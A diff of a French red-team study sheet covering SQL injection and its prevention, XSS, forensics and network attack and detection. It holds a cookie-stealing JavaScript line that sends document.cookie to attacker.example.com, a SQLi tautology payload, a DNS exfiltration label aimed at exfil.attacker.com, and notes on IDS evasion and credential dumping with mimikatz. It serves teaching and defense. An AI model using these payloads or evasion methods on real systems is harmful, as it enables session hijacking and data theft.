@@ -158,6 +158,9 @@
 ---
 
 ## 3) Détecter et exploiter une SQL Injection (SQLi)
+- **Qu’est-ce qu’une SQL Injection (SQLi)**
+ - Attaque consistant à injecter du code SQL malveillant dans des champs d’entrée (formulaires, paramètres d’URL, headers) afin que l’application exécute des commandes SQL non prévues par le développeur.
+ - Objectifs courants : lire/altérer la base, contourner l’authentification, exfiltrer données sensibles, modifier le schéma.
 
 - **Processus de détection**
   - Tester caractères spéciaux (`'`, `"`, `--`) et tautologies (`' OR 1=1--`) pour provoquer des comportements différents.
@@ -173,8 +176,13 @@
 - **Outils**
   - `sqlmap` pour automatiser, mais commencer par tests manuels pour un PoC propre.
 
+  **Prévention côté backend (meilleures pratiques)**
+
+- **Utiliser des requêtes paramétrées / prepared statements** : ne jamais concaténer des entrées utilisateur dans la chaîne SQL. Les paramètres sont liés séparément par le driver DB (ex : `cursor.execute("SELECT * FROM users WHERE id = %s", (id,))`).
+    
+    - _Pourquoi_ : empêche l’interprétation du contenu utilisateur comme du SQL.
+
 - **Glossaire rapide**
-  - **SQLi (SQL Injection)** : insertion de code SQL malveillant via des entrées non-sanitized.
   - **Tautologie** : expression toujours vraie (ex : `1=1`) utilisée pour contourner filtres.
   - **UNION SELECT** : clause SQL pour combiner résultats de plusieurs requêtes.
   - **Blind SQLi** : quand l’application ne renvoie pas d’erreur, on infère via réponses booléennes ou temps.
@@ -191,8 +199,8 @@
 
 - **Exfiltration simple de cookie**
   - Exemple JS injecté :  
-    ```js
-    new Image().src = 'https://attacker.example.com/?c=' + encodeURIComponent(document.cookie);
+ ```js
+new Image().src = 'https://attacker.example.com/?c=' + encodeURIComponent(document.cookie);
     ```
   - Condition : si le cookie **n’est pas** protégé par le flag `HttpOnly`, le script peut le lire et l’envoyer à un serveur contrôlé.
 
@@ -1019,199 +1027,337 @@
   - **LLMNR/NBT-NS poisoning** : techniques de spoofing de résolution de noms locales permettant de capturer authentifications.
 
 
-
-
-
-# Forensic 
-
-
-- **1) Méthodologie pour collecter des preuves sur une machine compromise**
-  - Préserver la scène : limiter modifications sur la machine (documenter actions).
-  - Acquisition bit-for-bit : utiliser outils (dd, FTK Imager, `ewfacquire`) pour cloner le disque.
-  - Capturer la mémoire vive (RAM) avant reboot si possible (`winpmem`, `volatility` compatible dumps).
-  - Collecte de logs (Event Logs Windows, syslog Linux) et export des configurations.
-  - Chain of custody : documenter qui, quand, comment chaque artefact a été copié.
-- **Glossaire rapide**
-  - **Acquisition bit-for-bit** : copie exacte de tous les secteurs d’un disque (image forensic).
-  - **Chain of custody** : traçabilité légale des preuves (qui a touché quoi et quand).
-  - **RAM dump** : capture du contenu de la mémoire vive, utile pour credentials/clé C2.
-
-- **2) Artefacts Windows pour établir une timeline**
-  - Event Logs : Security, System, Application (`wevtutil`/Event Viewer).
-  - MFT (Master File Table) : timestamps de fichiers (création, modification, accès).
-  - Prefetch & Amcache : informations sur exécutables récemment lancés.
-  - Scheduled Tasks, Services, Run keys (registre) pour persistance.
-  - Browser history, LNK files, Recent Items pour actions utilisateurs.
-- **Glossaire rapide**
-  - **MFT** : table principale NTFS listant métadonnées fichiers.
-  - **Prefetch** : mécanisme Windows qui accélère lancement d’apps et garde traces.
-  - **LNK** : raccourci Windows qui contient chemin, timestamps et parfois volume serial.
-
-- **3) Analyser une image disque Linux pour traces d’intrusion**
-  - Monter image en lecture seule (`mount -o ro,loop`), ou utiliser outils (`ewfmount`, `autopsy`).
-  - Examiner `/var/log/` (auth.log, syslog), cron jobs, unit files systemd, `.bash_history`.
-  - Inspecter `/etc/passwd`, `/etc/shadow` (si accessible dans l’image) et permissions.
-  - Rechercher fichiers modifiés, nouveaux comptes, clés SSH dans `/home/*/.ssh`.
-- **Glossaire rapide**
-  - **ewfmount / Autopsy** : outils pour monter / analyser images forensic.
-  - **auth.log** : fichier de logs d’authentification sur distributions Linux.
-
-- **4) Détecter un implant persistant déguisé**
-  - Scanner services et drivers installés (`sc query`, `lsmod`), comparer signatures binaires.
-  - Rechercher objets autorun (Run keys, Scheduled Tasks, systemd services non standards).
-  - Vérifier modules noyau suspects et binaires sans signature ou modifiés récemment.
-  - Analyse comportementale : connexions réseau périodiques, beacons, processus enfants inhabituels.
-- **Glossaire rapide**
-  - **Driver / Kernel module** : composant chargé au niveau noyau (fort privilège).
-  - **Beacon** : signal périodique d’un implant vers son C2.
-
-- **5) Extraire secrets depuis la mémoire (limitations éthiques/légales)**
-  - Privilèges & légalité : n’extraire que si autorisé; respect de la confidentialité.
-  - Outils : `volatility`, `rekall`, `mimikatz` (Windows) pour extraire credentials/cleartext.
-  - Limites : chiffrement en mémoire, Credential Guard, mémoire paginée, EDR protections.
-- **Glossaire rapide**
-  - **Volatility / Rekall** : frameworks d’analyse mémoire.
-  - **Credential Guard** : mécanisme Windows qui isolte secrets pour empêcher dumping.
-
-- **6) Outils d’analyse réseau/pcap et indicateurs recherchés**
-  - Outils : Wireshark (GUI), `tshark`/`tcpdump` (CLI), Zeek (surveillance), NetworkMiner.
-  - Rechercher : connexions persistantes à IP/Domaines inconnus, motifs de beaconing (intervalle régulier), DNS anomalies (longues sous-domaines, TXT exfil).
-  - Extraction de fichiers via HTTP/FTP, analyse de flux chiffrés (SNI, JA3 fingerprints).
-- **Glossaire rapide**
-  - **PCAP** : format de capture de paquets réseau.
-  - **Zeek** : moteur de détection réseau fournissant logs analytiques (conn.log, dns.log).
-  - **JA3** : fingerprint TLS client basé sur la suite chiffrage/extension, utile pour détecter C2.
-
-- **7) Corrélation logs réseau & hôte pour reconstituer parcours**
-  - Aligner timestamps (convertir zones, synchronisation NTP) et normaliser formats.
-  - Identifier pivot points : connexions sorties d’une machine, hops via jump hosts, cred reuse.
-  - Utiliser SIEM/ELK pour corréler événements (EventID, Netflow, pcap alerts) et produire timeline.
-- **Glossaire rapide**
-  - **SIEM / ELK** : plateformes de collecte et corrélation de logs (Splunk, ELK Stack).
-  - **Netflow** : méta-données de flux réseau (qui a parlé à qui et combien).
-
-- **8) Analyse d’un binaire suspect (statique & dynamique)**
-  - Statique : `strings`, `objdump`, `readelf`, hash du binaire, vérifier signatures / compilation date.
-  - Dynamique : sandbox (Cuckoo), exécution instrumentée (`strace`, `ltrace`, `gdb`) pour observer comportements.
-  - Network callbacks : surveiller DNS/HTTP/HTTPS vers domaines suspects, extraits d’URLs.
-- **Glossaire rapide**
-  - **Cuckoo** : sandbox d’analyse automatique de malware.
-  - **strings / readelf** : outils pour extraire chaînes et métadonnées d’un binaire.
-
-- **9) Usage de hash (MD5/SHA) pour l’intégrité des preuves**
-  - Calculer hash (MD5, SHA256) sur images et fichiers pour prouver intégrité lors de transfert et analyse.
-  - Documenter les valeurs et conserver copies sécurisées (write-once if possible).
-- **Glossaire rapide**
-  - **Hashing forensic** : pratique standard pour garantir immutabilité d’une preuve.
-
-- **10) Exemple de rapport forensique — sections & niveau de détail**
-  - Résumé exécutif (impact, portée), méthodologie, timeline détaillée, artefacts extraits, PoC, recommandations techniques et steps de remediation, annexes (hashes, commandes utilisées).
-  - Niveau technique : fournir données exploitables (IOCs, queries SIEM, requêtes YARA) sans divulguer données sensibles.
-- **Glossaire rapide**
-  - **IOC (Indicator of Compromise)** : signatures/actions permettant d’identifier intrusion (IP, hash, domain).
-  - **YARA** : langage pour décrire patterns de malware.
+# Forensic — Fiche Red Team
 
 ---
 
-# Réseau 
+## 1) Méthodologie pour collecter des preuves sur une machine compromise
 
-- **1) Pile TCP/IP : différences TCP vs UDP, handshake, flags importants**
-  - **TCP**
-    - Connexion orientée (handshake 3-way SYN,SYN-ACK,ACK) ; fiable, retransmission, ordering.
-    - Flags importants : SYN (init), ACK (acknowledge), FIN (close), RST (reset), PSH (push), URG.
-  - **UDP**
-    - Sans état, pas de handshake, faible overhead, utilisé pour DNS, VoIP, streaming.
-  - **Glossaire rapide**
-    - **Handshake 3-way** : SYN → SYN-ACK → ACK pour établir connexion TCP.
-    - **Port** : identifiant logique pour service (80 HTTP, 443 HTTPS).
-
-- **2) MITM (Man-in-the-Middle) : ARP spoofing, DHCP spoofing, DNS spoofing**
-  - **ARP spoofing**
-    - Usurpation d’ARP pour rediriger trafic local via l’attaquant (require being on same L2).
-  - **DHCP spoofing**
-    - Fournir réponses DHCP malicieuses pour contrôler gateway/DNS attribués aux clients.
-  - **DNS spoofing / poisoning**
-    - Répondre avec de fausses IPs pour des domaines ciblés ; utiliser `dnsspoof`, rogue DNS servers.
-  - **Mitigations**
-    - DHCP snooping, ARP inspection (switch features), DNSSEC, monitoring ARP tables.
-  - **Glossaire rapide**
-    - **L2** : couche 2 (liaison) du modèle OSI — LAN local.
-    - **DHCP snooping** : protection réseau empêchant serveurs DHCP non autorisés.
-
-- **3) NAT / PAT et fonctionnement de la translation de ports**
-  - **NAT (Network Address Translation)**
-    - Traduction d’adresses privées en adresse publique ; permet réutilisation d’espaces d’adresses.
-  - **PAT (Port Address Translation)**
-    - Multiplexe plusieurs connexions internes sur une seule IP publique en différenciant par ports source.
-  - **Glossaire rapide**
-    - **NAT table** : mapping entre (IP,port) interne et externe.
-    - **Cone NAT / Symmetric NAT** : types de NAT impactant connectivité P2P.
-
-- **4) Port forwarding / pivoting depuis hôte compromis**
-  - **SSH tunneling**
-    - `ssh -R` (reverse tunnel) ou `ssh -L` (local forwarding) pour forwarder ports via SSH.
-  - **socat / proxychains / RPort**
-    - Utiliser `socat` pour rediriger sockets, ou proxychains to chain proxies; `rport` for remote port forwarding frameworks.
-  - **Pivoting**
-    - Utiliser compromised host as jump to reach internal-only networks (proxychains+sshuttle).
-  - **Glossaire rapide**
-    - **Reverse tunnel** : tunnel initié par la victime vers l’attaquant (permet de bypass NAT/firewall).
-    - **sshuttle** : VPN-like tool for tunneling TCP over SSH.
-
-- **5) MTU / fragmentation et abus pour contourner détection**
-  - **MTU (Maximum Transmission Unit)**
-    - Taille maximale d’un paquet sur un lien ; fragmentation découpe paquets trop grands.
-  - **Abus**
-    - Fragmenter payloads pour casser signatures IDS, utiliser overlapping fragments or tiny fragments to evade pattern matching.
-  - **Mitigations**
-    - Reassemble fragments at IPS, inspect fragment reassembly, tune MTU and detection rules.
-  - **Glossaire rapide**
-    - **Fragmentation** : division d’un paquet IP en plusieurs fragments.
-    - **Overlapping fragments** : fragments recouvrants pouvant corrompre inspection simple.
-
-- **6) Que regarder dans un PCAP pour repérer un C2**
-  - Chercher beacons périodiques (interval régulier), DNS anomalies (queries pour domaines générés), connexions à IPs rare/externes, pattern of small regular payloads.
-  - Inspecter User-Agent oddities, TLS SNI vs certificate mismatch, JA3/JA3S fingerprints.
-  - Extraire fichiers via reassembly of HTTP/FTP flows.
-  - **Glossaire rapide**
-    - **Beaconing** : pattern périodique indiquant check-in d’un implant.
-    - **SNI** : Server Name Indication — nom de domaine envoyé en clair dans handshake TLS.
-
-- **7) Contournement IDS/IPS (encodage, fragmentation, tunneling chiffré)**
-  - Techniques : base64/URL encode payloads, chunking, use of HTTPS to hide content, DNS/ICMP tunneling to exfiltrate.
-  - Tradeoffs : furtivité vs bande passante/latency ; tunneling chiffré augmente difficulté de détection.
-  - **Glossaire rapide**
-    - **DNS tunneling** : encapsuler données dans requêtes DNS (exfiltration possible).
-    - **ICMP tunneling** : utiliser paquets ICMP pour transporter données.
-
-- **8) DNS exfiltration et détection**
-  - **Principe**
-    - Encodage de données dans sous-domaines d’une zone contrôlée par l’attaquant (ex: `AAABBB.attacker.com`).
-  - **Détection**
-    - Rechercher sous-domaines très longs, haut taux de NXDOMAIN, volumes anormaux de requêtes DNS, patterns d’encodage (base32/base64).
-  - **Mitigations**
-    - DNS logging, rate-limiting, use of DNS proxy/inspection, block dynamic DNS if not needed.
-  - **Glossaire rapide**
-    - **NXDOMAIN** : réponse DNS indiquant que le nom n’existe pas.
-    - **Dynamic DNS** : services permettant mise à jour DNS dynamique (peuvent faciliter exfiltration).
-
-- **9) Canal covert (DNS, ICMP, HTTPs) — tradeoffs OPSEC**
-  - **DNS** : furtif et souvent autorisé, faible bande passante.
-  - **ICMP** : souvent filtré mais parfois autorisé, cadence détectable.
-  - **HTTPS** : sûr pour masquer, mais nécessite C2 infra et peut être détecté via JA3/timing/anomalies.
-  - **Choix** : HTTPS pour usage covert haute bande passante; DNS pour petits paquets/commande.
-  - **Glossaire rapide**
-    - **Covert channel** : canal de communication caché utilisé pour exfiltrer/donner commandes.
-    - **JA3** : client TLS fingerprint utile pour détection.
-
-- **10) Concevoir règles de détection réseau pour comportements Red Team**
-  - Détecter beacons via anomaly detection (periodic connections, regular intervals).
-  - Détecter DNS anomalies (volume, length, entropy, NXDOMAIN spikes).
-  - Monitor for uncommon ports/protocols, unusual certificate fingerprints, suspicious SNI mismatches, long-lived sessions from user endpoints.
-  - Fournir playbook de réponse (isoler hôte, capturer pcap, dump mémoire).
-  - **Glossaire rapide**
-    - **Entropy** : mesure d’aléa dans un string (utilisée pour détecter encodage ou data exfiltrée).
-    - **Playbook** : procédure étape par étape pour réponse aux incidents.
+- **Principes**
+  - Préserver l'intégrité des preuves : acquisition bit-for-bit, calcul de hash (MD5/SHA256) avant/après transfert.
+  - Respecter la chaîne de custody (qui a manipulé quoi, quand).
+  - Prioriser la collecte volatile (mémoire, connexions réseau) avant shut down si possible.
+- **Étapes pratiques**
+  - Documenter l’état initial (screenshots, liste de process, connexions réseau).
+  - Dumper la mémoire (`winpmem`, `volatility` plugins, `dd`/`gnome-disk` selon OS).
+  - Faire une image disque bit-for-bit (`dd`, `FTK Imager`, `dcfldd`) et calculer hash.
+  - Collecter logs (Event Viewer, syslog, application logs), fichiers de config, artefacts utilisateur.
+- **Glossaire rapide**
+  - **Acquisition bit-for-bit** : copie exacte du média incluant secteurs non alloués.
+  - **Chain of custody** : enregistrement officiel des manipulations des preuves.
+  - **Volatile data** : données en mémoire RAM ou connexions qui disparaissent au redémarrage.
 
 ---
 
+## 2) Artefacts Windows pour établir une timeline
+
+- **Sources clés**
+  - *Event Logs* (`Security`, `System`, `Application`) : événements d’auth, services, erreurs.
+  - *MFT (Master File Table)* : timestamps de création/modification/suppression des fichiers (NTFS).
+  - *Prefetch* : indique exécution d’applications (Windows ≤10) et chemins.
+  - *Registry* : `HKCU\Software`, `Run` keys, `Amcache.hve`, `SAM` informations.
+  - *Scheduled Tasks* : `Task Scheduler` entries.
+- **Utilisation**
+  - Corréler horodatages entre sources, prendre en compte décalages horaires et UTC.
+  - Utiliser timelines (Plaso/Log2Timeline) pour automatiser la corrélation.
+- **Glossaire rapide**
+  - **MFT** : table contenant métadonnées fichiers sur NTFS.
+  - **Prefetch** : mécanisme Windows optimisant démarrage d’apps, utile pour forensics.
+  - **Plaso / log2timeline** : outils pour construire timeline unifiée à partir de multiples sources.
+
+---
+
+## 3) Analyser une image disque Linux pour traces d’intrusion
+
+- **Étapes**
+  - Monter l’image en lecture seule (`mount -o ro,loop image.img /mnt/point`).
+  - Examiner `/var/log/` (auth.log, syslog, messages), `/etc/cron*`, `~/.ssh/authorized_keys`, `/home/*/.bash_history`.
+  - Examiner `/proc` images et `dmesg` dumps si disponibles.
+  - Rechercher fichiers récents ou binaires modifiés (`find / -mtime -n`), analyse de hashes pour détecter binaires modifiés.
+- **Outils**
+  - `sleuthkit` (`fls`, `icat`), `autopsy`, `bulk_extractor`, `strings`, `rkhunter`.
+- **Glossaire rapide**
+  - **Image disque** : copie bit-for-bit d’un media de stockage.
+  - **sleuthkit / autopsy** : outils pour l’analyse forensic de systèmes de fichiers.
+  - **bulk_extractor** : extraire artefacts (emails, URLs) sans montage.
+
+---
+
+## 4) Détecter un implant persistant déguisé
+
+- **Où regarder**
+  - Services et drivers (Windows: `services.msc`, Linux: `systemd` units).
+  - Entrées de démarrage (`Run` keys, `Startup` folders, `cron`, `systemd timers`).
+  - Binaries dans chemins non standards (`/tmp`, `C:\Windows\Temp`) et scripts encodés.
+- **Indicateurs**
+  - Binaries signés non correspondants, processus avec connexions réseau atypiques, DLLs injectées, hooks.
+  - Timestamps incohérents ou fichiers effacés récemment (MFT $LogFile, USN Journal).
+- **Glossaire rapide**
+  - **USN Journal** : journal de modifications sur volume NTFS.
+  - **DLL injection** : technique pour exécuter code dans l’espace mémoire d’un autre processus.
+
+---
+
+## 5) Extraire des secrets depuis la mémoire — méthodes & limites
+
+- **Méthodes**
+  - Dump mémoire (`winpmem`, `LiME` for Linux), analyser avec `Volatility`, `Rekall`.
+  - Chercher patterns (clé privée PEM, mots de passe en clair, tokens) via `strings` et regex.
+  - Utiliser outils spécialisés (`mimikatz`, `pypykatz`) pour extraire credentials de LSASS (Windows).
+- **Limites & éthique**
+  - Extraction peut violer politiques; nécessite autorisation.
+  - Résultats parfois volatiles/incomplets, chiffrement en mémoire peut réduire efficacité.
+- **Glossaire rapide**
+  - **Volatility** : framework d’analyse de mémoire pour extraire artefacts.
+  - **LiME** : Linux Memory Extractor pour dumper RAM.
+
+---
+
+## 6) Outils pour analyse réseau / pcap et signatures recherchées
+
+- **Outils**
+  - `Wireshark`/`tshark`, `Zeek` (Bro), `NetworkMiner`, `tcpdump`.
+- **Signatures / indicateurs**
+  - Connexions périodiques (beacons), DNS anomalies (long labels, high entropy), exfiltration via DNS, HTTP(s) with unusual User-Agent, uncommon ports, TLS with self-signed certs.
+  - Protocol anomalies (HTTP over non-standard ports, DNS over HTTP(s), DNS TXT data).
+- **Glossaire rapide**
+  - **Beacon** : communication périodique d’un implant vers C2.
+  - **Zeek** : moteur d’analyse réseau générant logs riches à partir de pcap.
+
+---
+
+## 7) Corréler logs réseau et logs hôte pour reconstituer parcours d’un attaquant
+
+- **Approche**
+  - Normaliser timestamps (UTC), corréler évènements par IP, port, PID, hashes de fichiers.
+  - Identifier séquences : recon → exploitation → post-exploit → exfiltration.
+  - Utiliser SIEM pour centraliser (Splunk, ELK) et écrire queries pour chaînes d’événements.
+- **Exemple**
+  - Un login suspect (event log) suivi d’une connexion sortante du processus identique dans pcap → probable exfiltration.
+- **Glossaire rapide**
+  - **SIEM** : corrélation et agrégation centralisée de logs pour détection.
+  - **UTC** : temps universel coordonné, standard pour corrélation temporelle.
+
+---
+
+## 8) Analyse d’un binaire suspect (strings, static analysis, sandbox)
+
+- **Étapes**
+  - Commencer par `strings`, `file`, `ltrace`/`strace` (Linux) ou `PEiD`, `strings`, `Dependency Walker` (Windows).
+  - Analyser métadonnées (compilation date, sections), rechercher URL/IP encodés, routines de network.
+  - Si safe, exécuter dans sandbox/VM instrumentée (Cuckoo) pour observer comportement réseau et fichiers créés.
+- **Glossaire rapide**
+  - **Static analysis** : analyser binaire sans l’exécuter.
+  - **Cuckoo Sandbox** : environnement d’analyse dynamique automatisée de malwares.
+
+---
+
+## 9) Utiliser des hash (MD5/SHA) pour l’intégrité des preuves
+
+- **But**
+  - Garantir que l’image/les fichiers n’ont pas été altérés depuis acquisition.
+- **Méthode**
+  - Calculer hash (SHA256 recommandé) immédiatement après acquisition, stocker en double (rapport & média) et recalculer après chaque copie/transfert.
+- **Glossaire rapide**
+  - **SHA256** : fonction de hachage cryptographique recommandée pour intégrité.
+  - **Hashing** : produire empreinte fixe d’un fichier pour vérification d’intégrité.
+
+---
+
+## 10) Exemple de rapport forensique — sections et niveau de détail
+
+- **Sections essentielles**
+  - Résumé exécutif (impact & recommandations), Contexte & scope, Méthodologie (outils & versions), Evidence collected (hashes, chemins), Timeline d’évènements, Findings détaillés (artefacts, PoC), Remediation recommendations, Annexes (commandes, scripts, captures).
+- **Niveau de détail**
+  - Technique pour les équipes SOC/IR (commandes, logs) + résumé compréhensible pour management.
+  - Inclure preuves chiffrées (hashes), timestamps, et capturer screenshots anonymisés si nécessaire.
+- **Glossaire rapide**
+  - **SOC (Security Operations Center)** : équipe qui surveille et réagit aux incidents.
+  - **IR (Incident Response)** : processus de réponse à incident de sécurité.
+
+---
+
+
+
+# Réseau — Fiche Red Team
+
+
+## 1) Pile TCP/IP — différence entre TCP et UDP, handshakes, flags importants
+
+- **TCP vs UDP**
+  - **TCP** : protocole orienté connexion, fiable (handshake, retransmission), ordering des paquets.
+  - **UDP** : protocole sans connexion, faible overhead, utilisé pour DNS, DNS over UDP, streaming.
+- **Handshake TCP**
+  - Three-way handshake : `SYN` -> `SYN/ACK` -> `ACK`.
+  - Termination via `FIN`/`ACK` ou `RST`.
+- **Flags importants**
+  - `SYN`, `ACK`, `FIN`, `RST`, `PSH`, `URG`.
+- **Glossaire rapide**
+  - **Handshake** : échange initial pour établir connexion TCP.
+  - **RST** : reset connection (force close).
+  - **PSH** : push flag signale données à délivrer immédiatement.
+
+---
+
+## 2) MITM — ARP spoofing, DHCP spoofing, DNS spoofing
+
+- **ARP spoofing**
+  - Lier adresse MAC de l’attaquant à l’IP d’un autre hôte (ex: gateway) pour intercepter trafic local.
+- **DHCP spoofing**
+  - Répondre à requêtes DHCP avec mauvaises configurations (gateway/DNS) pour rediriger trafic.
+- **DNS spoofing**
+  - Poisoning cache DNS local ou manipulation de résolutions pour pointer vers IP malveillante.
+- **Contre-mesures**
+  - DHCP snooping, dynamic ARP inspection, DNSSEC, use of static ARP entries in critical hosts.
+- **Glossaire rapide**
+  - **ARP** : résout IP -> MAC sur réseaux locaux.
+  - **DNSSEC** : sécurité pour DNS assurant intégrité des réponses DNS.
+
+---
+
+## 3) NAT, PAT, et translation de ports
+
+- **NAT (Network Address Translation)**
+  - Traduction d’adresses privées vers adresse publique (souvent sur routeur).
+- **PAT (Port Address Translation)**
+  - Plusieurs hôtes privés partagent une même IP publique via mapping ports (NAT overload).
+- **Fonctionnement**
+  - Router maintient table NAT : (privateIP:port) <-> (publicIP:port).
+- **Glossaire rapide**
+  - **NAT table** : table de correspondance des connexions traduites.
+  - **Port forwarding** : redirection d’un port public vers hôte interne.
+
+---
+
+## 4) Port forwarding / pivoting depuis hôte compromis (SSH tunneling, proxychains, socat, RPort)
+
+- **SSH tunneling**
+  - `ssh -R` (remote), `ssh -L` (local) pour forwarder ports; `ssh -D` pour SOCKS proxy.
+- **Socat**
+  - Redirection flexible (TCP/UDP), création de tunnels chiffrés, relays.
+- **Proxychains / RPort**
+  - Forcer applications à passer via proxy local (proxychains) ou utiliser outils dédiés de pivoting.
+- **Glossaire rapide**
+  - **SOCKS proxy** : protocole de proxy générique pour TCP/UDP via tunnel.
+  - **ssh -D** : crée un proxy SOCKS local.
+
+---
+
+## 5) MTU, fragmentation, et abus pour contourner détections
+
+- **MTU (Maximum Transmission Unit)**
+  - Taille maximale d’une trame IP; fragmentation découpe paquets plus grands en fragments.
+- **Abus / contournement**
+  - Fragmenter payloads d’attaque pour échapper aux signatures basées sur contenu (IDS reassembly failures).
+  - Manipuler `DF` (Don't Fragment) bit pour forcer fragmentation comportement.
+- **Glossaire rapide**
+  - **Fragmentation** : division d’un paquet IP en plusieurs fragments pour transmission.
+  - **DF bit** : indique si le paquet peut être fragmenté.
+
+---
+
+## 6) Quoi regarder dans un pcap pour repérer un C2
+
+- **Signes typiques**
+  - Connexions périodiques (beacons) avec intervalle régulier.
+  - Trafics chiffrés non-standards (TLS with uncommon ciphers, odd SNI), User-Agent suspicious.
+  - DNS anomalies (requetes TXT, big labels, NXDOMAIN patterns).
+  - Longues connexions HTTPS to unknown hosts with low data transfer.
+- **Outils**
+  - Wireshark, Zeek logs, Splunk/ELK with PCAP ingestion, Moloch/Arkime.
+- **Glossaire rapide**
+  - **SNI** : Server Name Indication — extension TLS indiquant nom d’hôte demandé.
+  - **NXDOMAIN** : réponse DNS signifiant nom inconnu; pattern useful for DGA detection.
+
+---
+
+## 7) Contournement IDS/IPS réseau (encodage, fragmentation, tunnels chiffrés)
+
+- **Techniques**
+  - Encodage payload (base64, XOR), fragmentation, polymorphism, using covert channels (DNS, ICMP).
+  - Utiliser TLS tunnels (HTTPS) or DNS-over-HTTPS to hide C2.
+- **Défenses**
+  - Reassembly des fragments, deep packet inspection (DPI), TLS inspection, anomaly detection baselines.
+- **Glossaire rapide**
+  - **DPI** : Deep Packet Inspection — analyse détaillée du contenu des paquets.
+  - **Covert channel** : canal de communication caché non prévu pour exfiltration.
+
+---
+
+## 8) DNS exfiltration et détection
+
+- **Méthodes**
+  - Encoder données en labels DNS (ex: `dGhpcy1pcw==.exfil.attacker.com`) et requêter via DNS.
+  - Utiliser requêtes TXT pour transporter payloads plus grands.
+- **Détection**
+  - Regarder entropie des labels, fréquence/domaines nouvellement créés, volume de requêtes vers domaines externes.
+  - Implement DNS logging and rate limits, block suspicious domains.
+- **Glossaire rapide**
+  - **Label** : segment d’un nom de domaine séparé par points.
+  - **Entropy** : mesure d’aléa d’une chaîne; élevée pour données encodées.
+
+---
+
+## 9) Canal covert (DNS, ICMP, HTTPs) — tradeoffs OPSEC
+
+- **Options**
+  - **DNS** : petit débit, discret, traverses many networks, peut être détecté par DNS logs.
+  - **ICMP** : souvent overlooked but monitored; low throughput.
+  - **HTTPS** : high throughput, blends with normal traffic but requires C2 infrastructure to mimic legit TLS.
+- **Tradeoffs**
+  - DNS/ICMP lower bandwidth but stealthier; HTTPS higher throughput but riskier if TLS fingerprinting/inspection in place.
+- **Glossaire rapide**
+  - **TLS fingerprinting** : identifier clients/servers based on TLS handshake metadata.
+  - **Throughput** : débit de données transférées.
+
+---
+
+## 10) Concevoir règles de détection réseau pour comportements Red Team
+
+- **Règles pratiques**
+  - Détecter beacons : alert if periodic connections to suspicious domains/IPs.
+  - Analyse de User-Agent et SNI anomalies (rare combo of headers).
+  - Monitor DNS: high entropy labels, many subdomains, sudden spikes in NXDOMAIN.
+  - Baseline normal traffic per host and alert deviations (bytes/time, session count).
+- **Glossaire rapide**
+  - **Baseline** : profil du comportement réseau normal d’un hôte/environnement.
+  - **SNI anomaly** : SNI value oddness (mismatch between domain and certificate).
+
+---
+
+## 11) Modèles OSI et TCP/IP — compréhension et correspondances
+
+- **Modèle OSI (Open Systems Interconnection)**  
+    Découpe théorique de la communication réseau en **7 couches** :
+    1. **Physique** – Transmission électrique/optique des bits (câbles, fibres, Wi-Fi, répéteurs).  
+        → _Ex : Ethernet, RJ45, ondes radio._
+    2. **Liaison de données (Data Link)** – Communication entre machines sur le même réseau local (adresses MAC, trames).  
+        → _Ex : Ethernet, Wi-Fi (802.11), ARP._
+    3. **Réseau (Network)** – Routage et adressage entre réseaux (IP, ICMP).  
+        → _Ex : IPv4/IPv6, ICMP (ping), OSPF._
+    4. **Transport** – Gestion de bout en bout (fiabilité, flux, segmentation).  
+        → _Ex : TCP, UDP._
+    5. **Session** – Établissement, maintien et fermeture des connexions.  
+        → _Ex : gestion de session RPC, NetBIOS._
+    6. **Présentation** – Formatage et chiffrement des données.  
+        → _Ex : SSL/TLS, JPEG, ASCII, JSON._
+    7. **Application** – Interface utilisateur et protocoles applicatifs.  
+        → _Ex : HTTP, DNS, FTP, SSH._
+- **Modèle TCP/IP (simplifié en 4 couches)**  
+    Représente une implémentation plus pratique utilisée sur Internet :
+    1. **Accès réseau (Network Interface)** → couches 1 et 2 OSI  
+        _Ethernet, ARP, PPP._
+    2. **Internet** → couche 3 OSI  
+        _IP, ICMP, IGMP._
+    3. **Transport** → couche 4 OSI  
+        _TCP, UDP._
+    4. **Application** → couches 5–7 OSI  
+        _HTTP, SMTP, DNS, SSH._
+
+- **Glossaire rapide**
+    
+    - **Encapsulation** : chaque couche ajoute son propre en-tête avant transmission.
+    - **PDU (Protocol Data Unit)** : nom donné à la donnée selon la couche (bit, trame, paquet, segment).
+    - **Dé-encapsulation** : processus inverse lors de la réception.
+    - **TCP/IP** : modèle plus simple, pratique et implémenté dans tous les systèmes modernes.
+    - **OSI** : modèle conceptuel utile pour enseigner et diagnostiquer (décomposition par couche).
